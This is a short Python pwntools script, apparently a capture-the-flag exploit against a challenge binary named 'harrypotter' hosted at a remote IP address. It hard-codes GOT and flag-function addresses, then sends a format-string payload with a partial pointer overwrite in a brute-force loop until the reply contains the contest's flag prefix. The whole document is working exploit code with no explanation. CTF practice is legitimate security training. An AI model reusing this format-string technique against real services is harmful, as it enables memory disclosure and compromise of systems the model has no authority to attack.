from pwn import *

puts_GOT = 0x600FA8
close_GOT = 0x600FD0
Read_FLAG = 0x400977
Cat_FLAG = 0x4009B6

STDOUT = 0x601020

#r = process('./harrypotter_patch')
#raw_input('?')

def find(x):
        r = remote('125.235.240.168', 27017)
        r.recvuntil("It's time to cast your spell\n")
        payload = "%12$s"#-%12$p-%12$s"
        payload += "\x00"*(0x30-len(payload))
        payload += p16(x)
        r.send(payload)
        try:
                kkk = r.recv(1024)
                r.close()
                return kkk
        except:
                r.close()
                return None

for i in range(0xffff):
        xxx = find(0xae70)
        log.info(xxx)
        if xxx == None:
                continue
        if "matesctf" in xxx:
                print "Found"
                break